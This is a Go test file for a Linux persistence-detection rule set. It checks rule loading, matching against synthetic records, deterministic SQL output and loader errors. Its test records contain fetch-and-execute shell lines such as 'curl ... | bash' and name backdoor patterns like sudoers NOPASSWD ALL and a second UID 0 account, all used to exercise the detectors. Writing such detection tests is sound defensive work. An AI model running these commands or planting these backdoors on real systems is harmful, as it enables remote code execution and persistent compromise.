package detections

import (
	"strings"
	"testing"

	"github.com/jarmidaw/linpersist/internal/core"
)

// loadRepoYAML returns the parsed embedded rule set. Tests run
// against the same bytes the report binary embeds at build time,
// so a regression here either means the YAML is malformed or the
// loader rejected something the binary will also reject. No
// filesystem walk needed; `go test` works from any cwd.
func loadRepoYAML(t *testing.T) *RuleSet {
	t.Helper()
	rs, err := LoadEmbedded()
	if err != nil {
		t.Fatalf("load embedded: %v", err)
	}
	return rs
}

// TestRepoYAMLLoads verifies that the committed detections.yaml
// parses and validates against the live signals catalog. Acts as
// the canary against drift between the YAML and core/signals.go.
func TestRepoYAMLLoads(t *testing.T) {
	rs := loadRepoYAML(t)
	if rs.SchemaVersion != SchemaVersion {
		t.Fatalf("schema_version = %d, want %d", rs.SchemaVersion, SchemaVersion)
	}
	if len(rs.Detections) == 0 {
		t.Fatal("rule set is empty")
	}
	// Sanity: every detection id should be unique (loader checks
	// this but a regression here is so cheap to catch we keep the
	// assertion explicit).
	seen := map[string]struct{}{}
	for _, d := range rs.Detections {
		if _, dup := seen[d.ID]; dup {
			t.Errorf("duplicate detection id %q", d.ID)
		}
		seen[d.ID] = struct{}{}
	}
}

// TestRepoYAMLMatchesQ7Goldens runs Match against synthetic records
// chosen to exercise every clause currently in detections.yaml. The
// expected detection set is hand-written from the YAML; a mismatch
// means either the YAML changed or the matcher's semantics drifted.
func TestRepoYAMLMatchesQ7Goldens(t *testing.T) {
	rs := loadRepoYAML(t)
	cases := []struct {
		name string
		rec  core.Record
		want []string
	}{
		{
			name: "orphan+tmp implant",
			rec: core.Record{
				Module:  "systemd",
				Signals: []string{core.SignalExecTargetOrphan, core.SignalInterpreterInTmp},
			},
			want: []string{"payload_under_tmp_via_persistence"},
		},
		{
			name: "sudoers nopasswd ALL backdoor",
			rec: core.Record{
				Module:  "sudoers",
				Signals: []string{core.SignalSudoersNoPasswd, core.SignalSudoersAllCommands},
			},
			want: []string{"sudoers_nopasswd_all_backdoor"},
		},
		{
			name: "uid 0 non-root account",
			rec: core.Record{
				Module:  "passwd",
				Signals: []string{core.SignalPasswdUIDZero},
			},
			want: []string{"second_uid_zero_account"},
		},
		{
			name: "kmod install directive",
			rec: core.Record{
				Module:  "kmod",
				Signals: []string{core.SignalKmodInstallDirective},
			},
			want: []string{"kmod_install_directive_implant"},
		},
		{
			name: "profile curl remote fetch",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "wget -qO- http://x/y | sh",
			},
			want: []string{"shell_init_remote_fetch"},
		},
		{
			name: "profile curl remote fetch (curl variant)",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "curl https://x/y | bash",
			},
			want: []string{"shell_init_remote_fetch"},
		},
		{
			name: "sysv referencing /tmp/",
			rec: core.Record{
				Module:         "sysv",
				ContentSnippet: "/tmp/.x/payload --daemon",
			},
			want: []string{"sysv_init_tmp_reference"},
		},
		{
			name: "motd remote fetch",
			rec: core.Record{
				Module:         "motd",
				ContentSnippet: "curl -s http://x/y | sh",
			},
			want: []string{"motd_remote_fetch"},
		},
		{
			name: "two clauses fire on one record",
			rec: core.Record{
				Module: "sudoers",
				Signals: []string{
					core.SignalSudoersNoPasswd, core.SignalSudoersAllCommands,
					core.SignalExecTargetOrphan, core.SignalInterpreterInTmp,
				},
			},
			want: []string{"payload_under_tmp_via_persistence", "sudoers_nopasswd_all_backdoor"},
		},
		{
			name: "benign sudoers root ALL=(ALL) ALL — must NOT match",
			rec: core.Record{
				Module:  "sudoers",
				Signals: []string{core.SignalSudoersAllCommands},
			},
			want: nil,
		},
		{
			name: "benign profile file with no curl/wget — must NOT match",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "export PS1='[\\u@\\h]\\$ '",
			},
			want: nil,
		},
		{
			name: "benign systemd unit (orphan but not in tmp) — must NOT match",
			rec: core.Record{
				Module:  "systemd",
				Signals: []string{core.SignalExecTargetOrphan},
			},
			want: nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := rs.Match(tc.rec)
			if !equalStrSlice(got, tc.want) {
				t.Errorf("Match: got %v, want %v", got, tc.want)
			}
		})
	}
}

// TestRepoYAMLSQLDeterministic verifies that RenderSQL is stable
// across calls (no map iteration order leaking out).
func TestRepoYAMLSQLDeterministic(t *testing.T) {
	rs := loadRepoYAML(t)
	a := rs.RenderSQL(DefaultSQLOptions)
	for i := 0; i < 8; i++ {
		b := rs.RenderSQL(DefaultSQLOptions)
		if a != b {
			t.Fatalf("RenderSQL is non-deterministic; iteration %d differs", i)
		}
	}
}

// TestLoaderRejectsBadInputs covers every failure path the loader is
// supposed to catch. Each case lists the YAML and the substring the
// error message must contain.
func TestLoaderRejectsBadInputs(t *testing.T) {
	cases := []struct {
		name string
		yaml string
		want string // substring of the expected error
	}{
		{
			name: "wrong schema version",
			yaml: "schema_version: 99\ndetections: [{id: x, when: {signals_any: [exec_target_orphan]}}]\n",
			want: "schema_version",
		},
		{
			name: "empty rule set",
			yaml: "schema_version: 1\ndetections: []\n",
			want: "empty",
		},
		{
			name: "missing id",
			yaml: "schema_version: 1\ndetections: [{when: {signals_any: [exec_target_orphan]}}]\n",
			want: "missing id",
		},
		{
			name: "non-snake-case id",
			yaml: "schema_version: 1\ndetections: [{id: Bad-Id, when: {signals_any: [exec_target_orphan]}}]\n",
			want: "snake_case",
		},
		{
			name: "duplicate id",
			yaml: "schema_version: 1\ndetections:\n  - {id: x, when: {signals_any: [exec_target_orphan]}}\n  - {id: x, when: {signals_any: [interpreter_in_tmp]}}\n",
			want: "duplicate id",
		},
		{
			name: "empty when",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {}}]\n",
			want: "no predicates",
		},
		{
			name: "unknown signal",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {signals_any: [definitely_not_a_signal]}}]\n",
			want: "unknown signal",
		},
		{
			name: "bad mitre id",
			yaml: "schema_version: 1\ndetections: [{id: x, mitre: [T123, T1234.99], when: {signals_any: [exec_target_orphan]}}]\n",
			want: "mitre id",
		},
		{
			name: "bad severity",
			yaml: "schema_version: 1\ndetections: [{id: x, severity: scary, when: {signals_any: [exec_target_orphan]}}]\n",
			want: "severity",
		},
		{
			name: "sql-unsafe content substring",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {module_in: [cron], content_contains_any: [\"O'Reilly\"]}}]\n",
			want: "SQL-unsafe",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Load([]byte(tc.yaml), nil, nil)
			if err == nil {
				t.Fatal("expected error, got nil")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not contain %q", err.Error(), tc.want)
			}
		})
	}
}

func equalStrSlice(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
